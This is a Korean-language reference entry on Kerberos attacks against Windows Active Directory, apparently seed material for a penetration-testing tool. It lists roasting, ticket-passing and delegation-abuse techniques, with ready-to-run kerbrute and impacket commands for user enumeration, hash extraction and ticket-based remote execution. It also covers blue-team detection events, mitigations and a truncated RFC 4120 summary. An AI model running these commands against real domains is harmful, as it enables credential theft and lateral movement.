# 학습 시드(심화): kerberos

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn kerberos`. P1: 머신별 라이트업 미참조.

## 개요
Kerberos(88): 윈도우 AD 인증. 티켓(TGT/TGS) 기반. 다수 공격면.

## 핵심 기법 · 열거
- 사용자 열거(kerbrute)·AS-REP Roasting·Kerberoasting
- Pass-the-Ticket·Overpass-the-Hash
- 위임(비제약/제약/RBCD) 악용·Golden/Silver Ticket
- 시계 동기(클럭 스큐) 필요

## 표준 도구 · 명령
```
kerbrute userenum -d <domain> users.txt --dc <dc>
impacket-GetNPUsers <domain>/ -usersfile u.txt -no-pass   # AS-REP
impacket-GetUserSPNs <domain>/user:pass -request          # Kerberoast
export KRB5CCNAME=tgt.ccache; impacket-psexec -k -no-pass <host>
```

## 블루팀 탐지
4768/4769 비정상 티켓요청·RC4(etype 0x17) 선호·4771 사전인증 실패·시계 스큐.

## 완화
강한 SPN 계정 암호·AES 강제·사전인증 필수·위임 최소화·보호된 사용자 그룹.

- 출처(검증): https://datatracker.ietf.org/doc/html/rfc4120

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### RFC 4120 Kerberos V5
- 출처: https://datatracker.ietf.org/doc/html/rfc4120
- 승격일: 2026-10-07
- 요약: This document provides an overview and specification of Version 5 of the Kerberos protocol, and it obsoletes RFC 1510 to clarify aspects of the protocol and its intended use that require more detailed or clearer explanation than was provided in RFC 1510. This document is intended to provide a detailed description of the protocol, suitable for implementation, together with descriptions of the appropriate use of protocol messages and fields within those messages. Neuman, et al. Standards Track [Pa
